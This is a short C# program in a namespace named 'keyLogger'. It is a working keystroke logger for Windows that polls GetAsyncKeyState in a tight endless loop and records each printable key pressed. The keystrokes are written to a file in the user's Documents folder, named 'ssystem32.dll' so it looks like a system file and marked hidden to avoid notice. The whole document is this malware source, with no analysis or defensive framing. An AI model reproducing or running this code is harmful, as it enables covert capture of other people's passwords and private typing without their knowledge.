using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace keyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 LIntCaracter);
        
        static void Main(string[] args)
        {
            int LIntKeyState;

            String LStrDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string LStrFile = LStrDirectory + "/ssystem32.dll";

            FCriarArquivo(LStrDirectory, LStrFile);

            while (true){
                Thread.Sleep(5);

                for (int LIntCaracter = 32; LIntCaracter < 127; LIntCaracter++) {                    
                    LIntKeyState = GetAsyncKeyState(LIntCaracter);                                                       

                    if (LIntKeyState == 32769) {      

                        using (StreamWriter LSw = File.AppendText(LStrFile)) {
                            LSw.Write((char)LIntCaracter);                            
                        }
                        
                    }
                }
            }
        }
     
        public static bool FCriarArquivo(string PvStrDirectory, string PvStrFile) {            
            if (!Directory.Exists(PvStrDirectory))
                Directory.CreateDirectory(PvStrDirectory);

            if (!File.Exists(PvStrFile)) {
                using (StreamWriter LSw = File.CreateText(PvStrFile)) {                        
                }
                File.SetAttributes(PvStrFile, File.GetAttributes(PvStrFile) | FileAttributes.Hidden);
            }          
            return true;
        }
    }
}